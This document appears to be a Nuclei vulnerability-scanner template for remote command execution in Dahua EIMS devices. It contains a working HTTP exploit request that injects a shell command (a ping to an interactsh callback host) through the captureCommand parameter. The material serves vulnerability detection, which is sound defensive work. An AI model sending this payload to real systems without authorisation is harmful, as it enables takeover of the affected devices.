# Nuclei Template: Dahua EIMS - Remote Command Execution
**Template ID:** dahua-eims-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`dahua-eims-rce.yaml`)

## Vulnerability Information & PoC

## Description
Dahua EIMS capture_handle interface allows remote command execution.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
```

## References
- https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8EEIMS-capture_handle%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
- https://cn-sec.com/archives/2554372.html
